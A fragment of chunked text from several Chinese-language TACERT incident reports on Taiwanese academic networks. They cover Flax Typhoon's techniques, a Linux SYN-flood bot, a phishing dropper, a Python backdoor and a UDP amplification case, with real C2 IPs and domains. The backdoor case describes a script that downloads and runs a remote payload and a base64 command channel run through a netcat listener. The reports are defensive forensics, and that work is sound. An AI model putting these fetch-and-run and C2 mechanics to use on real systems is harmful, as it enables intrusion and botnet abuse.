        "content": "連線之指令 Flax Typhoon 會通過安裝在受感染系統上的 SoftEther VPN 橋接功能將 網路流量路由到其他目標系統。 這些網路流量被用於網路掃描、漏洞掃描和 弱點利用嘗試等。 6. 防禦規避(Defense Evasion)TA0005 Flax Typhoon 對VPN 連線採取了多項預防措施,以使其更難被識別。首 先,攻擊者使用企業環境中可以找到的合法 VPN 應用程式,因為該檔案本 身肯定不會被防毒軟體偵測到。其次,攻擊者會將VPN 應用程式的可執行檔 vpnbridge.exe 重新命名為Windows 元件的名稱如 conhost.exe 或 dllhost.exe。這些名稱分別模仿合法的 Windows 主控台的應用程式或COM Surrogate 元件的檔案名稱。第三,攻擊者使用 SoftEther 的 VPN-over-HTTPS 操作模式,該模式使用協議通道將乙太網路封包封裝成相容於 HTTPS 的封 包,並將其透過TCP 通訊協定443 埠進行傳輸。這使得 VPN 連線流量很難 與合法的 HTTPS 流量區分開來,而大多數的網路安全設備不會阻止合法的 HTTPS 流量。 Flax Typhoon 還會尋找「系統還原點」。這些還原點用作緊急備份; 如 果出現系統問題,使用者可以使用它們將系統恢復到先前的狀態。 然而,Flax Typhoon 利用這些資訊來更好地了解受感染系統的狀態與消除任何可能暴露  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 其行為的痕跡 [T1070]。 7. 憑證訪問(Credential access)TA0006 一旦 Flax Typhoon 在目標系統上建立,下一步就是竊取使用者的登入憑 證,其中可能是密碼或加密的密碼雜湊值。它們主要針對儲存本機系統密碼 的兩個位置,分別為本機安全認證子系統服務(LSASS) [T1003.001]之處理程 序占用的記憶體內容和安全性帳戶管理員(SAM)登錄檔配置的內容 [T1003.002 ]。前述兩者都包含登入本地系統的使用者的密碼",
        "Page_Num": "7,8"
    },
    "613": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "雜湊值。 本質上,這兩個位置充當 Windows 電腦內的「密碼保險箱」。 為了「破 解」這些保險箱並提取其中的密碼,Flax Typhoon 經常使用一種名為 Mimikatz 的工具。 一旦他們獲得這些密碼雜湊值,他們就可以離線破解它 們或使用它們進行雜湊值傳遞攻擊 [T1550.002],以像合法使用者一樣輕鬆地 進一步存取其他電腦或系統。 三、 總結 1. 經由分析可知Flax Typhoon 的攻擊專注於持久性、橫向移動和憑證存 取。它通過利用服務大眾的伺服器中的已知漏洞並部署 China Chopper(中 國菜刀) 等 Web shell 來實現初始訪問。初始訪問後,Flax Typhoon 使用 命令列工具首先通過遠端桌面協議來建立持久訪問,然後部署 VPN 連線 到攻擊者控制的網路基礎設施,最後從受感染的系統收集憑證。Flax Typhoon 進一步從受感染系統使用此 VPN 訪問來掃描目標系統和組織 上的漏洞。 2. Flax Typhoon 使用合法的工具來進行攻擊,一般防毒軟體不易發現該攻擊 之惡意行為。因此,遭受攻擊後如何應變處理與如何預防它的攻擊變成一 個重要議題。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 四、 Flax Typhoon 攻擊之應變處理 受影響的組織需要評估其網路中Flax Typhoon 活動的規模,刪除惡 意工具和 C2 基礎設施,並檢查日誌中是否存在可能已被用於惡意目的 的盜用帳戶的跡象。 建議可用下列方式調查可疑的被盜用帳戶或受影響的系統。 1. 查找 LSASS 和 SAM 傾印以識別受影響的帳戶。 2. 檢查受感染帳戶的活動是否存在任何惡意操作或外洩的資料。 3. 關閉或更改所有受損帳戶的憑證。根據活動級別,許多帳戶可能會受到 影響。 4. 應隔離受影響的系統並對其進行取證檢查,以查找惡意活動的痕跡。 5. 由於 Flax Typho",
        "Page_Num": "8,9"
    },
    "614": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": "on 會更改操作系統的設定以產生惡意行為,因此受影 響的系統可能需要停用或恢復到已知的良好設定。 五、 預防Flax Typhoon 之攻擊 預防 Flax Typhoon 使用的技術始於漏洞和修補程式管理,特別是暴 露於網際網路的系統和服務。所使用的憑證訪問技術也可以通過適當的系 統強化來緩解。下面為預防Flax Typhoon 攻擊的防護建議,提供參考。 1. 保持服務大眾的伺服器處於最新狀態,以防禦惡意活動。作為威脅行為 者的主要目標,這些的伺服器需要額外的監控和安全保護。使用者輸 入驗證、檔案完整性監控、行為監控和 Web 應用程式防火牆都可以幫 助保護這些伺服器的安全。 2. 監視 Windows 登錄檔是否有未經授權的更改。稽核登錄檔功能允許管 理員在修改特定登錄機碼時產生事件。此類策略可以檢測破壞系統安 全性的登錄檔更改,例如:遇到Flax Typhoon 所做的更改時。 3. 使用網路監控和入侵偵測系統來識別異常或未經授權的網路流量。如果  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 組織不將 RDP 用於特定業務目的,則任何 RDP 流量都應被視為未經 授權並產生警報。 4. 確保 Windows 系統及時更新最新的安全修補程式。 5. 通過實施強大的多重身份驗證 (MFA) 策略,降低有效帳戶被盜的風 險。 無密碼登錄方法、密碼過期規則以及停用未使用的帳戶也有助於 降低此訪問方法帶來的風險。 6. 使用本地管理員密碼解決方案 (LAPS) 等工具隨機化本地管理員密 碼,以防止使用具有共享密碼的本地帳戶進行橫向移動。 7. 減少攻擊面。 使用者可以啟用以下攻擊面減少規則來阻止或審核與此 威脅相關的一些觀察到的活動: (1) 封鎖從 Windows 本機安全性授權子系統竊取認證(lsass.exe)。 (2) 封鎖源自 PSExec 與 WMI 命令的程序建立。某些組織可能會在 某些伺服器系統上遇到此規則的相容性問題",
        "Page_Num": "9,10"
    },
    "615": {
        "File_Name": "個案分析-駭客組織Flax Typhoon分析報告.pdf",
        "content": ",但應將其部署到其他 系統以防止源自 PsExec 和 WMI 的橫向移動。 8. 通過群組原則設定 WDigest 的 UseLogonCredential 登錄檔數值,以降 低 LSASS 程式記憶體傾印成功的風險。 9. 在 Microsoft Defender 防毒軟體中啟用雲端提供的保護或執行端點檢 測和應變(EDR)工具,以防護快速發展的攻擊者工具、技術和行為。 六、 參考資料 1. Flax Typhoon using legitimate software to quietly access Taiwanese organizations https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-usi ng-legitimate-software-to-quietly-access-taiwanese-organizations/ 2. 臺灣企業組織遭到中國駭客Flax Typhoon 寄生攻擊  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team https://www.ithome.com.tw/news/158467 3. The Camouflage Killer: How the Flax Typhoon Hack Weaponized Legitimate Software https://www.txone.com/blog/how-flax-typhoon-hack-weaponized-legitimate- software/ 4. MITRE ATT&CK--Enterprise tactics https://attack.mitre.org/tactics/enterprise/ ",
        "Page_Num": "10,11"
    },
    "616": {
        "File_Name": "個案分析-Ｋ大學SYN Flood的殭屍主機事件分析報告_10402.pdf",
        "content": "1 個案分析- K大學SYN Flood 的殭屍 主機事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/2  2 I. 事件簡介 1. 近期接獲該校資訊安全管理的老師反映,校內有一台主機疑似遭受入侵 成為駭客所用的殭屍電腦。 2. 該主機主要因為占用大量的網路頻寬流量,造成網路壅塞而被發現疑似 正在進行中繼站或者其他攻擊行為。 3. 本單位協助該校進行封包側錄並鑑識,找出其發生的原因及解決方式。 4. 經過詢問主機基本狀態,為一台Ubuntu Linux 主機並有啟用SSH service 讓管理者方便登入維護。 II. 事件檢測 1. 透過SSH 遠端登入該主機檢查網路狀態,並透過netstat 指令發現有可 疑連線正與外部IP 的port 2822 進行連線,而該連線的程式名稱卻是 gnome-terminal,實為偽裝成正常程式的惡意程式。 2. 透過指令 lsof 觀察惡意程式PID 883 的狀態,得知其原始檔案名稱應 為「woqcayiya」,並確實正與IP 位址118.193.206.44 進行連線,且其 路徑為「/boot/woqcayiya」。 3. 測試將網路介面eth0 手動關閉,發現網路介面會立刻再啟用,以確保網  3 路恢復正常。故檢查背景程式發現到有一可疑檔案 cron (3865) 在執 行,追查其路徑存在於 /etc/cron.hourly/cron.sh 。 4. 檢視cron.sh 腳本內容得知,該程式主要目的是持續檢查所有網路卡的 介面狀態,一旦有被關閉就會自動啟用,確保惡意程式不會因為網路中 斷而停止連線。 1. 「for i in ... do ifconfig $i up& done」於背景執行啟用網路。 5. 測試將主機reboot 重新開機,惡意程式依然會自動啟用,故檢查開機自 動啟動區的目錄有發現到可疑程式「/etc/rc[1-5].d/S90woqcayiyan」。 6. 捷徑檔S90woqcayiyan 為連結",
        "Page_Num": "1,2,3"
    },
    "617": {
        "File_Name": "個案分析-Ｋ大學SYN Flood的殭屍主機事件分析報告_10402.pdf",
        "content": "至路徑檔案「/etc/init.d/woqcayiyan」, 並檢視其內容可知真正作用的執行檔確實位於「/boot/woqcayiyan」,且 不論以何運行級別[1-5]開機皆會啟用。  4 7. 檢查其側錄的封包內容得知,惡意程式主要會連到外部的port 80 和 port 2822,其中port 2822 的連線數很少,大多都是port 80 連線數最 多。 8. 查看port 2822 的連線狀態,主要都是以該主機IP 向外部少數IP 進行 連線,可能為上層C&C 主機或中繼站。 1. 隨機檢視一個session,由主機IP 向美國的位址162.212.180.202 的TCP port 2822 進行資料傳送,而傳送資料都是經過加密,此可能 為回報用途。 2. 另一種是主機端會偽造成其他IP 向C&C 162.212.180.202 的UDP port 2822 進行資料回報,其為132bytes 經過加密的內容大小,而 其偽造的規則通常只是隨機改變原本IP 的幾個數字。  5 3. 待C&C 中繼站收到殭屍電腦回報的資料後,有可能會回覆一串加密的 資料,作為下達SYN Flood 攻擊的指令以及攻擊的對象主機IP。 9. 查看port 80 的連線狀態,主要殭屍主機收到上層C&C 指令後,在短時 間內耗盡可用頻寬,開始大量向外部IP 進行SYN Flood 的攻擊,並且送 出的都是payload 為1Kbyte 的SYN 加密封包。 10. 該惡意程式進行SYN Flood 的攻擊態樣有兩種: 1. 一種是由本機單一IP 對外部數十個IP 進行攻擊,受害者大多為 142.4.X.X 的加拿大網段,皆為port 80 的網站伺服器。受害者國家 約有5 個國家。  6 2. 一種是偽造本機端的大量IP 對單一特定主機進行攻擊,此種方式完 全捨棄原本機端的IP,全而偽造成其他IP 來進行攻擊",
        "Page_Num": "3,4,5,6"
    },
    "618": {
        "File_Name": "個案分析-Ｋ大學SYN Flood的殭屍主機事件分析報告_10402.pdf",
        "content": ",來躲避追查 來源端,受害者也多為網站伺服器。從記錄上來看偽造的IP 數量約 50000 筆,國家數為171 國。 11. 最後在「/tmp/vun/」 資料夾中發現兩支可疑的程式,分別為 「tcmcwyhivs」和「wisczuhpvm」兩支執行檔案,實際於VM 虛擬機中執 行後,該兩支程式會自動自我刪除,判斷此為駭客一開始植入的程式, 而以上分析的行為及產生的檔案都是後續結果。  7 III. 網路架構圖 Hacker STEP 1 : 駭客透過SSH破解登入受害主機並植入執行惡意程式。 STEP 2 : 駭客能夠存取控制多數的C&C中繼站。 STEP 3.1 : 受害的殭屍電腦定期回報資料給中繼站的Port 2822。 STEP 3.2 : C&C中繼站下達攻擊指令給殭屍電腦。 STEP 4 : 殭屍電腦開始大量對外主機port 80進行SYN Flood攻擊。 STEP 4 SYN Flood 攻擊 外部特定主機port 80 受害的殭屍電腦 140.X.X.Y Victims STEP 3.1 資料定期回報 Port 2822 STEP 1 SSH入侵植入程式 STEP 2 控制上層C&C中繼站 STEP 3.2 下達攻擊指令 C&C中繼站群: 162.212.180.202 118.193.206.44 等 IV.運作流程與結論 1. 首先駭客透過 SSH 破解帳號密碼登入該校主機並於 「/tmp/vun/」植入 後門程式「tcmcwyhivs」和「wisczuhpvm」,成為殭屍電腦。 2. 該後門程式執行後會於 /etc/cron.hourly/ 產生cron.sh 的script, 用來偵測網路卡啟用狀態。 3. 該後門程式另外會於開機排程中「/etc/rc[1-5].d/」自動執行產生的惡 意程式 「/boot/woqcayiyan」。 4. 該woqcayiyan 會自動向上層C&C 中繼站的port 2822 進行回報,並接受 上層",
        "Page_Num": "6,7"
    },
    "619": {
        "File_Name": "個案分析-Ｋ大學SYN Flood的殭屍主機事件分析報告_10402.pdf",
        "content": "的攻擊指令。 5. 殭屍電腦收到攻擊指令後開始向特定主機進行SYN Flood 攻擊,且會於 封包中偽造來源端的IP 位置以規避受害方偵測。  8 V. 問題排除與防範建議 1. 先移除被植入的後門檔案 /tmp/vun/「tcmcwyhivs」和「wisczuhpvm」。 2. 透過「ps aux|grep woqcayiya」找出惡意程式的PID。 3. 使用 kill -9 [PID] 刪除該程式背景運作。 4. 刪除 cron.hourly/cron.sh 及 rc[1-5].d/S90woqcayiyan 的自動排 程。 5. 關閉或限制 SSH 外部登入 IP 網段權限,並更改帳號及提升密碼強度 6. 定期檢查主機網路通訊埠的連線狀態,以及注意是否有異常大量的網路 流量,以防範被入侵的可能。 ",
        "Page_Num": "7,8"
    },
    "620": {
        "File_Name": "個案分析-Ｍ大學之電子郵件社交工程事件分析報告_10307.pdf",
        "content": "1 個案分析- M大學之電子郵件社交工 程事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/07  2 一. 事件簡介 1. 103 年3 月中旬一位署名「On Behalf Of 系統管理者」寄了一 封主旨為『【資訊安全通知】有關資訊安全,請全校教職員生配 合事項。』給全校主管及師生,並夾帶惡意程式檔案引誘用戶 打開去安裝。 2. 其信件內文提到『資訊安全暨個人資料保護推行委員會第四次 會議決議』讓人誤以為真實會議,然而仔細查看該校確實有該 會議,但並非第四次會議也無提及郵件安全性議題,故內容可 知為偽造。 3. 從寄件者的位址為「cornmail@163.com」可以直接判定為非管 理人員帳號,網域名稱為「Guangzhou, P.R. China」所註冊擁  3 有,故幾乎能判定為大陸駭客所使用。 4. 該信件的附加檔案為setup.zip,解壓縮後為『setup.exe』, 但大小只有132 KB 並執行需要管理者權限,相當可疑。 二. 事件檢測 1. 首先將該惡意程式『setup.exe』上傳至Virustotal 檢測,發 現檢測出的比例居然是0/50,也就是說沒有任何一家的防毒軟 體能偵測出是惡意程式。 2. 實地用系統Win7 (x64) 進行檔案測試,並且側錄其網路封包 行為。 A. 將setup.zip 解壓後得出setup.exe 執行檔,執行該檔案待 執行完畢後惡意程式及自我移除,隨後立即檢查背景程式執 行情形卻看不出明顯異常。  4 B. 過了一段時間檔案總管系統程式「explorer.exe」的CPU 及 RAM 的使用率偏高一些,檢測其網路行為赫然發現居然開始 向外部連線傳送資料。 C. 此紀錄的主要有兩個連外IP,分別為「27.154.108.225」和 「222.79.106.65」,這些IP 皆來自中國的福建省廈門。 a. 從網域名稱「dynamic.163data",
        "Page_Num": "1,2,3,4"
    },
    "621": {
        "File_Name": "個案分析-Ｍ大學之電子郵件社交工程事件分析報告_10307.pdf",
        "content": ".com.cn」判斷為動態非固 定制IP。 b. 「163data.com.cn」網域名稱為「中国电信集团公司」所 擁有。  5 D. 惡意程式可能透過某種系統漏洞,合法控制 explorer.exe, 將感染主機的所有文件存取權限取得,利用網路行為 SYN_SENT 傳送至上層主機的DNS PORT 53,以規避可能的資 安設備偵測。 E. 從網路封包來分析發現,感染主機會不斷向網域名稱發送加 密資料,該網域名稱為「joanxu.xicp.net」,經過DNS 解析 IP 就是「222.79.106.65」和「27.154.108.225」。 a. 由於DNS 正解析都是對應到此兩IP,且此兩IP 都網域反 解析皆不是「joanxu.xicp.net」,研判此兩IP 可能也是 中繼站跳板。 b. 該網域名稱「xicp.net」的註冊商為上海的一間公司, 「SHANGHAI BEST ORAY INFORMATION S&T CO. LTD.」,可 能為中國的駭客所為。 F. 從側錄的封包中無法得知傳送的資料內容,都是經過特殊加 密方式的密文。  6 三. 網路架構示意圖 Hacker STEP 1 : 個人電腦主機收到偽造的APT惡意郵件。 STEP 2 : 個人電腦主機執行郵件的附加惡意檔案並遭受感染。 STEP 3 : 受感染主機會透過合法「explorer」程序,將主機資料傳至網址 「joanxu.xicp.net:53」,IP為「222.79.106.65」或「27.154.108.225」。 STEP 4 : 駭客可接收來至「joanxu.xicp.net」的中繼資料達到資料竊取目的。 Infected PC STEP 3 Data Sending STEP 1 APT Mail joanxu.xicp.net:53 Mail Server STEP 4 Data receiving STEP 2 Execute Attachment 四. 結論  7 1. 該資安事件主要是透過偽造的APT 郵件社交工程攻擊方式。 2. 當使用者誤執行郵件附加檔案setup",
        "Page_Num": "4,5,6,7"
    },
    "622": {
        "File_Name": "個案分析-Ｍ大學之電子郵件社交工程事件分析報告_10307.pdf",
        "content": ".exe 後,原本的檔案會自 行移除且取得系統程式權限,並不會產生明顯的惡意程式在背 景執行。 3. 檔案總管程式explorer.exe 會不定期對外部網址進行連線,並 且將資料透過加密方式傳送出去。 4. 針對explorer.exe 進行Virustotal 檢測也無任何異常,故無 法明確針對有問題檔案進行排除。因為explorer.exe 是系統檔 案,若將之移除會造成系統無法正常使用。 5. 任何電子郵件只要有附加檔案(特別是執行檔),一定要多加留 意可能的危險。 五. 建議措施 1. 因為setup.exe 並無產生新的惡意程式,故舊有防毒軟體無法 偵測出異常行為。 2. 最佳的解決方式就是重新安裝作業系統,並安裝防毒軟體做基 本防護。 3. 開啟郵件前務必檢查來源端位址是否正常,若非公司內部網域 可能都是惡意郵件。 4. 就算是公司網域來源端位址的郵件也要特別注意附加檔案是否  8 異常,若為exe、com 或scr 等執行檔就不要開啟。 5. 現今網路攻擊方式太多樣化,使用者養成良好資安觀念才是最 安全的保護方式。 ",
        "Page_Num": "7,8"
    },
    "623": {
        "File_Name": "個案分析-Ｐ大學遭植入惡意後門程式的主機事件分析報告_10406.pdf",
        "content": "1 個案分析- P大學遭植入惡意後門程 式的主機事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2015/6  2 I. 事件簡介 1. 該校主機系統管理人員發現該主機疑似有可疑程式在背景執行。 2. 該系統使用Linux 系統,並作為重要對外服務用的系統主機。 3. 由於該主機為重要設備,管理者已先行將惡意程式移除。 4. 管理者並將惡意程式樣本請本單位協助分析,以了解惡意程式的可能行 為。 5. 本單位所使用的惡意程式測試環境為Win7 及Linux Centos。 II. 事件檢測 1. 取得的惡意程式樣本中,主要有 test.py 和 test.exe 兩支程式,主要 功能為建立環境的腳本程式。 2. test.exe 為一個自解壓縮執行檔,需在windows 系統下執行,內容分別 為「_wpcap_.bat、npf.sys、Packet.dll、SCServ.exe、wpcap.dll」五 個檔案。 1. 檔案「_wpcap_.bat」內容為,將 packet.dll 和wpcap.dll 複製至 「windows\\system32\\」,將npf.sys 複製至「system32\\drivers\\」, 將SCServ.exe 複製至 「Program Files\\」後啟用,而將 SCServ.exe 寫入自動開機啟用,隨後將所有解壓縮的檔案全部刪 除。  3 3. 從「_wpcap_.bat」中可知該檔案為建立環境腳本,將必要的工具檔案複 製到系統中後,主要以惡意程式 SCServ.exe 為惡意連線程式。 4. 透過procexp 工具查看背景程式執行狀況,惡意程式 SCServ.exe 的檔 案描述和發布廠商是空白的,並且在virustotal 上有被偵測出 3/57 的 比例是異常。 5. 透過 autoruns 工具查看程式開機時狀態, SCServ.exe 被寫入系統 service 機碼中啟用。 6. 透過virustotal 檢測 SCServ.exe,檢測出的比例 3/57 相當低,只要 三",
        "Page_Num": "1,2,3"
    },
    "624": {
        "File_Name": "個案分析-Ｐ大學遭植入惡意後門程式的主機事件分析報告_10406.pdf",
        "content": "家防毒軟體有偵測出為木馬後門程式,這些防毒軟體在台灣幾乎很少 人使用。  4 7. 檢測test.exe 執行後,會自動先執行批次檔「_wpcap_.bat」,隨後執行 惡意程式SCServ.exe,觀察側錄的網路封包行為得知,惡意程式不會直 接向特定IP 報到,而是透過網域名稱跳板連線。 8. 惡意程式會先DNS 查詢網址「live.cakverd.com」,然而該網域早已失 效,故此連線並不成功,觀察不到後續行為。 9. 該惡意程式 SCServ.exe 會存在於資料夾 C:\\Program Files\\ 中,並且 寫入開機服務區自動啟用。 10. 因在windows 的環境中無法明確得知惡意程式的網路行為,故同時測 試test.py 在Linux 環境中的運作行為。 11. 透過兩台Linux 主機的環境測試,檢視script 檔案test.py 內容得 知,該檔案為建立主體惡意程式所需要的環境。主要透過該script 去修 改系統的基礎設定,例如將DNS 伺服器的IP 改為8.8.8.8,並從網址下  5 載http://live.cakverd.com/scsl.py 檔案,並存在路經 /bin/ 底 下,然後將惡意程式 scsl.py 寫入 /etc/rc.local 開機自動執行。 12. 檢視test.py 片段內容,可以看到如果登入帳號是root 時候,會先修 改 resolve.conf 的 nameserver 為8.8.8.8,然後再透過DNS 解析連 到http://live.cakverd.com/ 下載scsl.py 惡意程式。 13. 惡意程式scsl.py 的路徑會存在 /bin/scsl.py ,最後透過nohup python 指令在背景執行該檔案。  6 14. 實際測試執行 test.py 程式後,發現該程式無法成功執行,原因是因 為惡意網址 http://live.cakverd.com/ 已經無法解析下載到 scsl.py。為了找到scsl.py 的原始碼,在國外網站",
        "Page_Num": "3,4,5,6"
    },
    "625": {
        "File_Name": "個案分析-Ｐ大學遭植入惡意後門程式的主機事件分析報告_10406.pdf",
        "content": "有人公開此檔案的原 始碼 https://gist.github.com/mjpieters/8757225。 15. 檢視該檔案scsl.py 的原始碼可以得知,內部包含了上層控制主機的 網址、通訊埠以及通關密碼等資訊。另外還有定義了許多攻擊函數,有 ddos 攻擊、IP 檢測及UDP 攻擊等,研判讓駭客方便可以透過指令發動殭 屍電腦攻擊。 16. 此scsl.py 部分程式碼可以看到網址是 usaserverav.dyndns.tv,為 一個動態DNS 網址。另外主機的tcp 控制埠是9999,以及髒話字詞的通 訊密碼。 17. 因為scsl.py 程式所設定連線的網址都已經失效,故將程式內原本的 惡意網址改成測試用的server IP,讓內部主機雙向測試。 18. 我們在server 端執行「nl –l 9999」,表示開啟 listen port 9999 並等待client 端透過 scsl.py 連線報到。當client 端惡意程式開始在 執行建立連線時,server 端就會持續出現「ZnVja3lvdQ==」及「dA==」 字串,透過base64 解碼後為密碼「fuckyou」及「t」。  7 19. 此時駭客Server 端已經成功取得Client 的root 權限,只要下達 base64 編碼的bash 指令就能進行操作,例如DDoS 或UDP Flood 等攻 擊。 20. 測試下達「cGluZyA4LjguOC44IA==dA==」指令看看,確實在client 端 背景中有以root 權限執行ping 的動作,並將執行畫面base64 加密回傳 至Server 端。 21. 透過封包分析來看,client 和server 之間確實是以base64 加密方式 通訊。Client 連線建立後會持續發送字元“t”給server 端,待server 端下達指令如“ping 8.8.8.8”後,client 端會回傳指令執行訊息給 server 端。  8 III. 網路架構圖 Hackers STEP 5 各種網路攻擊 遭入侵的主機",
        "Page_Num": "6,7,8"
    },
    "626": {
        "File_Name": "個案分析-Ｐ大學遭植入惡意後門程式的主機事件分析報告_10406.pdf",
        "content": "140.X.X.Y (TANET) Victims STEP 2 HTTP下載惡意程式 scsl.py STEP 1 入侵植入 test.py C&C usaserverav.dyndns.tv :9999 中繼站 live.cakverd.com STEP 3 向C&C進行報到 STEP 4 下達base64編碼指令 STEP 6 竊取主機資料 1. 駭客透過某種方式入侵並植入test.py 的程式。 2. 主機執行test.py 後會向 live.cakverd.com 下載scsl.py 惡意程式。 3. Scsl.py 執行後會向上層C&C 報到等待指令。 4. C&C 會下達控制指令進行網路攻擊等動作。 5. 主機開始向外部進行網路攻擊。 6. 駭客也能隨時竊取主機內的檔案資料。 IV. 建議與總結 1. 由於此案例並無實際接觸到原始受害主機,無法得知該病毒確切入侵方  9 式,推測可能是透過SSH 或TELNET 遠端登入植入。 2. 排除方式先將該背景程式用kill 指令關閉,並將 /bin/scsl.py 檔案移 除,以及開機啟動區中 /etc/rc.local 內的 scsl.py 啟用移除。 3. 透過病毒樣本測試分析,得知駭客可能夠取得root 權限進行遠端控制, 並且透過感染主機進行對外攻擊或竊取資料。 4. 惡意程式中所連線的上層C&C 伺服器並非直接透過IP 連線,而是透過 DNS 網域名稱解析連線,此好處是一旦網址失效舊追查不到確切IP 位 址。 5. 該惡意程式原始碼於網路上公布的時間為2014 年上半年,推測受害主機 遭受感染可能有半年以上。 6. 由於該主機並無直接對外的Web 服務,建議若有SSH 或TELNET 服務務必 限制登入來源端IP。 7. 加強系統的帳號及密碼強度,避免容易被猜測入侵。 8. 時常檢查系統的登入LOG 紀錄及背景開啟程式及網路通訊埠,以減少被 感染的可能性。 ",
        "Page_Num": "8,9"
    },
    "627": {
        "File_Name": "個案分析-Ｙ大學之UDP Flood攻擊事件分析報告_10306.pdf",
        "content": "1 個案分析- Y大學之UDP Flood 攻擊 事件分析報告 TACERT 臺灣學術網路危機處理中心團隊製 2014/06  2 一. 事件簡介 1. Y 大學電算中心資安人員發現某系所IP 的網路流量異常的大, 隨即遭受網路封鎖。 2. 資安人員通知本單位TACERT 前往協助資安鑑識處裡。 3. 該感染主機為一台網頁伺服器,並具有網路硬碟分享功能讓 其他有權限者能夠存取。 二. 事件檢測 1. 該主機的作業系統是 Windows Server 2003 版本。 2. 有安裝防毒軟體 NOD32,但是病毒碼最後更新是2011 年,且 無法再自動更新,為停止運作狀態。 3. 該主機有開啟遠端桌面連線功能,且管理者帳戶密碼設定的 相當簡單為「12345」,故被破解機率登入極高。 4. 透過TCPVIEW 的網路埠號監控軟體發現,有相當多的TCP 或  3 UDP PORT 是被開啟的,可能被駭客利用來做網路攻擊行為。 A. 原本的Port 80 和443 為網頁伺服器所使用。其他的Port 7、9、13、17、19 等連接埠疑似為惡意程式 tcpsvcs.exe 所使用。 B. 其中TCP port 19 正在發送大量的資料出去,因為登入的 帳號權限不足或系統異常,tcpview 似乎無法看到正在連 接的IP。 C. 從程式管理工具來看tcpsvcs.exe的記憶體及CPU使用率 並不高,但觀察其通訊埠的使用狀況就能發現異常,因為 同時啟用了TCP 和UDP 的各五個Port。  4 D. 將tcpsvcs.exe 上傳至Virustotal 檢測,並無檢測出任 何惡意程式,因為此程式為windows 系統內建的檔案,主 要用在DHCP server 的服務。 E. 觀察封包的側錄狀況得知,會造成大量網路流量的原因是 UDP Flooding,該主機port 19 在短時間接收來自各地 IP 的UDP 封包,導致頻寬阻塞。 a. 目前來看封包數多寡的IP 依序為",
        "Page_Num": "1,2,3,4"
    },
    "628": {
        "File_Name": "個案分析-Ｙ大學之UDP Flood攻擊事件分析報告_10306.pdf",
        "content": ",50.89.131.39、 76.91.29.198、108.211.6.11、108.221.6.111、 68.229.1.208、174.26.24.179、107.214.80.227、 108.237.253.48、98.167.148.250 等五十個以上不同  5 IP。 b. 主要的IP來源國家為美國、英國以及歐洲部分國家, 紀錄上至少有16 個國家。 F. 從封包行為來看,當主機收到外部IP 的UDP 封包後,會 有大量的訊息回覆,回覆內容為重複的序列的字串。從往 返封包大小可知,原本60 bytes 的大小被放大至1078 bytes,將近可達18 倍,故可能導致對外頻寬壅塞。  6 G. 另外一種類似的網路行為是DNS server 的服務,該程式 dns.exe 可能會被用來做為DNS 放大攻擊。  7 三. 網路架構圖 Hacker STEP 1 : 主機遭受駭客遠端桌面入侵,利用windows內建的漏洞作為攻擊工具。 STEP 2 : 主機會開啟Port 19,並接收外部IP的封包後回覆大量封包形成UDP Flooding。 STEP 2 UDP Flooding 受感染主機 140.X.X.194:19 大量各國 IP STEP 1 遠端桌面登入(弱密碼) 四. 建議措施 1. 手動將tcpsvcs.exe 停用後移除,然而該檔案有可能會再次 自動出現,原因可能是系統自動修復造成。 2. 建議直接從控制台的服務裡面,找到一個DHCP server 的服  8 務,進入設定手動停用該服務,因為該服務會去呼叫 tcpsvcs.exe 啟用。 3. 管理者的密碼務必做變更,並且限制遠端桌面登入的來源端 IP。 4. 若是有大量dns.exe 程序執行但不是正常使用DNS 服務,則 也能到控制台的服務設定,手動停用DNS server 的服務,以 避免被利用來作為DNS 放大攻擊。 五. 總結 1. 此主機是因為有開放遠端桌面登入,然而沒有限制登入IP 範 圍,且",
        "Page_Num": "4,5,6,7,8"
    },
    "629": {
        "File_Name": "個案分析-Ｙ大學之UDP Flood攻擊事件分析報告_10306.pdf",
        "content": "管理者密碼長久未更改而被駭客破解。 2. 駭客登入後利用windows server 的漏洞,利用內建的服務程 式去做UDP Flooding 的攻擊,成為駭客的工具跳板。 3. 因為tcpsvcs.exe 和dns.exe 是系統內建程式,防毒軟體並 不會有偵測到木馬或病毒,但防毒軟體還是必須維持在較新 的版本以防惡意程式植入。 ",
        "Page_Num": "8"
    },
    "630": {
        "File_Name": "學術網路風險威脅評估報告-1.pdf",
        "content": "1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 學術網路風險威脅評估報告-1  說明 隨著網路的興起,相關的網路攻擊事件也層出不窮。為了因應此新興的威脅, 教育部於TANet 網路上部署了不同的偵測點來偵測相關的網路威脅並記錄 於SOC 資料庫中。因此TACERT 與南區教育學術資訊安全監控中心 (South- Academic Security Operation Center,簡稱S-ASOC)合作,分析其所記錄的威 脅資訊,從中取得駭客所熱衷攻擊的網路服務資訊,並分析其所使用之攻擊 手法及提出相對應之應變措施,除此之外,TACERT 運用”主動式網路威脅 偵測系統”來偵測TANet 內之主機是否正在運作相關的網路服務,而曝露在 潛在的威脅之中。  S-ASOC 偵測資料分析 本份資料源自S-ASOC 107 年度1 至4 月所偵測到的資訊,TACERT 從此份 資料中,能夠取得在此期間,駭客所熱衷攻擊的網路服務類型及其所運用的 攻擊手法,相關資訊如下表所示(次數)。 服務名稱/月份 201801 201802 201803 201804 RDP 1222111546 986049533 1224188179 1021918282 udp/53413 642780605 496573641 1860390725 961327538 TELNET 562549417 565945067 508142954 449283335  攻擊手法說明 在本節中,TACERT 針對上述相關網路服務的攻擊手法進行說明  RDP網路服務 網路 服務 RDP 威脅 名稱 MS.RDP.Connection.Brute.Force 說明 RDP(Remote Desktop Protocol)為微軟所提供的遠端桌面服務, 它允許使用者以帳號及密碼的方式從遠端登入,並提供類似桌面 的方式來操作受控主機。此服務的通訊埠預設於埠3389 上,也因 其認證方式僅使用帳號及密碼來進行驗證。因此常遭受到外部攻  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 擊者以暴力猜測密碼的方式來",
        "Page_Num": "1,2"
    },
    "631": {
